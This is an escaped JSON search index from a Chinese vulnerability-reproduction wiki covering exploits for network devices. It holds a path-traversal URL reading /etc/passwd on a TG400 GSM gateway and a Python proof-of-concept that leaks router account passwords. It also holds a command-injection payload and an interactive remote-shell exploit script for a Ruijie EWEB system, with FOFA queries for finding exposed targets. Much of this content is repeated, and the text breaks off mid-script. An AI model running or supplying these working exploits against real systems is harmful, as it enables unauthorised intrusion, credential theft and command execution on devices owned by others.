\u7f51\u5173\u5b58\u5728\u76ee\u5f55\u904d\u5386 \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6717\u89c6 TG400 GSM \u7f51\u5173 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6682\u65e0FOFA\u8bed\u53e5\u53ca\u56fa\u4ef6\u8bbe\u5907\u590d\u73b0 \u83b7\u53d6\u56fa\u4ef6\u89e3\u5bc6\u5bc6\u7801 http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwd\uff1a http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd \u53c2\u8003\u6587\u7ae0 \u00b6 https://github.com/SQSamir/CVE-2021-27328","title":"\u6717\u89c6 TG400 GSM \u7f51\u5173\u76ee\u5f55\u904d\u5386  CVE-2021-27328"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/#\u6717\u89c6-tg400-gsm-\u7f51\u5173\u76ee\u5f55\u904d\u5386--cve-2021-27328","text":"","title":"\u6717\u89c6 TG400 GSM \u7f51\u5173\u76ee\u5f55\u904d\u5386  CVE-2021-27328"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6717\u89c6 TG400 GSM \u7f51\u5173\u5b58\u5728\u76ee\u5f55\u904d\u5386 \uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6717\u89c6 TG400 GSM \u7f51\u5173","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6682\u65e0FOFA\u8bed\u53e5\u53ca\u56fa\u4ef6\u8bbe\u5907\u590d\u73b0 \u83b7\u53d6\u56fa\u4ef6\u89e3\u5bc6\u5bc6\u7801 http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwd\uff1a http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/#\u53c2\u8003\u6587\u7ae0","text":"https://github.com/SQSamir/CVE-2021-27328","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/","text":"\u8702\u7f51\u4e92\u8054 \u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 \u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e CVE-2019-16313 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5b58\u5728\u63a5\u53e3\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u662f\u901a\u8fc7\u6b64\u6f0f\u6d1e\u5f97\u5230\u8def\u7531\u5668\u8d26\u53f7\u5bc6\u7801\u63a5\u7ba1\u8def\u7531\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 FOFA \u00b6 [!NOTE] app=\"\u8702\u7f51\u4e92\u8054-\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u767b\u5f55\u540e\u53ef\u4ee5\u770b\u5230\uff0c\u8d26\u53f7\u5bc6\u7801\u5b58\u5728\u63a5\u53e3\u8bbf\u95ee \u800c /action/usermanager.htm \u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u53ef\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u83b7\u5f97\u8d26\u53f7\u5bc6\u7801 [!NOTE] \u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6 state\u503c\u4e3a 3 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /action/usermanager.htm \\033 [0m\" . format ( target_url )) if \"pwd\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d IFW8_Enterprise_router_Password_leakage_","title":"\u8702\u7f51\u4e92\u8054 \u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 \u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e CVE-2019-16313"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#\u8702\u7f51\u4e92\u8054-\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v431-\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e-cve-2019-16313","text":"","title":"\u8702\u7f51\u4e92\u8054 \u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 \u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e CVE-2019-16313"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5b58\u5728\u63a5\u53e3\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u662f\u901a\u8fc7\u6b64\u6f0f\u6d1e\u5f97\u5230\u8def\u7531\u5668\u8d26\u53f7\u5bc6\u7801\u63a5\u7ba1\u8def\u7531\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#fofa","text":"[!NOTE] app=\"\u8702\u7f51\u4e92\u8054-\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u767b\u5f55\u540e\u53ef\u4ee5\u770b\u5230\uff0c\u8d26\u53f7\u5bc6\u7801\u5b58\u5728\u63a5\u53e3\u8bbf\u95ee \u800c /action/usermanager.htm \u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u53ef\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u83b7\u5f97\u8d26\u53f7\u5bc6\u7801 [!NOTE] \u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6 state\u503c\u4e3a 3","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /action/usermanager.htm \\033 [0m\" . format ( target_url )) if \"pwd\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94/%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d IFW8_Enterprise_router_Password_leakage_","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/","text":"\u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CNVD-2021-09650 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf\u90e8\u5206\u63a5\u53e3\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\uff0c\u5bfc\u81f4\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u83b7\u53d6\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"\u9510\u6377\u7f51\u7edc-EWEB\u7f51\u7ba1\u7cfb\u7edf\" icon_hash=\"-692947551\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u5728 /guest_auth/guestIsUp.php <?php //\u67e5\u8be2\u7528\u6237\u662f\u5426\u4e0a\u7ebf\u4e86 $userip = @ $_POST [ 'ip' ]; $usermac = @ $_POST [ 'mac' ]; if ( ! $userip || ! $usermac ) { exit ; } /* \u5224\u65ad\u8be5\u7528\u6237\u662f\u5426\u5df2\u7ecf\u653e\u884c */ $cmd = '/sbin/app_auth_hook.elf -f ' . $userip ; $res = exec ( $cmd , $out , $status ); /* \u5982\u679c\u5df2\u7ecf\u4e0a\u7ebf\u6210\u529f */ if ( strstr ( $out [ 0 ], \"status:1\" )) { echo 'true' ; } ?> \u8fd9\u91cc\u770b\u5230\u901a\u8fc7\u547d\u4ee4\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020\u547d\u4ee4\u6267\u884c\uff0c POST /guest_auth/guestIsUp.php mac = 1 & ip = 127 .0.0.1 | cat /etc/passwd > PeiQi.txt \u7136\u540e\u8bbf\u95ee\u9875\u9762 /guest_auth/PeiQi.txt \u5c31\u53ef\u4ee5\u770b\u5230\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u9510\u6377\u7f51\u7edc-EWEB\u7f51\u7ba1\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"mac=1&ip=127.0.0.1| whoami > PeiQi_test.txt\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u6267\u884c\u547d\u4ee4 whoami \\033 [0m\" . format ( target_url )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/guest_auth/PeiQi_test.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"mac=1&ip=127.0.0.1| {} > PeiQi_test.txt\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/guest_auth/PeiQi_test.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"\u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CNVD-2021-09650"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#\u9510\u6377nbr\u8def\u7531\u5668-eweb\u7f51\u7ba1\u7cfb\u7edf-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-cnvd-2021-09650","text":"","title":"\u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CNVD-2021-09650"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf\u90e8\u5206\u63a5\u53e3\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\uff0c\u5bfc\u81f4\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u83b7\u53d6\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#fofa","text":"[!NOTE] title=\"\u9510\u6377\u7f51\u7edc-EWEB\u7f51\u7ba1\u7cfb\u7edf\" icon_hash=\"-692947551\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u5728 /guest_auth/guestIsUp.php <?php //\u67e5\u8be2\u7528\u6237\u662f\u5426\u4e0a\u7ebf\u4e86 $userip = @ $_POST [ 'ip' ]; $usermac = @ $_POST [ 'mac' ]; if ( ! $userip || ! $usermac ) { exit ; } /* \u5224\u65ad\u8be5\u7528\u6237\u662f\u5426\u5df2\u7ecf\u653e\u884c */ $cmd = '/sbin/app_auth_hook.elf -f ' . $userip ; $res = exec ( $cmd , $out , $status ); /* \u5982\u679c\u5df2\u7ecf\u4e0a\u7ebf\u6210\u529f */ if ( strstr ( $out [ 0 ], \"status:1\" )) { echo 'true' ; } ?> \u8fd9\u91cc\u770b\u5230\u901a\u8fc7\u547d\u4ee4\u62fc\u63a5\u7684\u65b9\u5f0f\u6784\u9020\u547d\u4ee4\u6267\u884c\uff0c POST /guest_auth/guestIsUp.php mac = 1 & ip = 127 .0.0.1 | cat /etc/passwd > PeiQi.txt \u7136\u540e\u8bbf\u95ee\u9875\u9762 /guest_auth/PeiQi.txt \u5c31\u53ef\u4ee5\u770b\u5230\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 